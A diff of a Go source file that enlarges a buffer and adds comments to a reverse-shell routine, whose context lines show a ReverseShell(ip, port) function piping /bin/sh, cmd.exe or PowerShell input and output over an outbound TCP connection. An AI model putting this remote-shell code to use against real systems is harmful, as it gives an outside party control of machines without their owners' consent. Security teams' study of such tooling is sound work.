@@ -16,7 +16,7 @@ const (
 	sh      = "/bin/sh"
 	cmd     = "C:\\Windows\\System32\\cmd.exe"
 	powersh = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-	buffer  = 256
+	buffer  = 512
 )
 
 func Run(shell string, tx chan<- []byte, rx <-chan []byte) {
@@ -36,6 +36,7 @@ func Run(shell string, tx chan<- []byte, rx <-chan []byte) {
 
 	}
 
+	// Read from connection and push it to the stdin of the shell
 	go func() {
 		for {
 			select {
@@ -46,6 +47,7 @@ func Run(shell string, tx chan<- []byte, rx <-chan []byte) {
 		}
 	}()
 
+	// Read the stderr of the shell
 	go func() {
 		for {
 			buf := make([]byte, buffer)
@@ -55,6 +57,7 @@ func Run(shell string, tx chan<- []byte, rx <-chan []byte) {
 		}
 	}()
 
+	// Read the stdout of the shell and write the output to the connection
 	cmd.Start()
 	for {
 		buf := make([]byte, buffer)
@@ -82,6 +85,7 @@ func ReverseShell(ip, port string) {
 
 	go Run(shell, tx, rx)
 
+	// Read from tcp connection and push data to the rx chan
 	go func() {
 		for {
 			data := make([]byte, buffer)
@@ -90,6 +94,7 @@ func ReverseShell(ip, port string) {
 		}
 	}()
 
+	// Read data from the tx chan and write it back to tcp connection
 	for {
 		select {
 		case outgoing := <-tx:
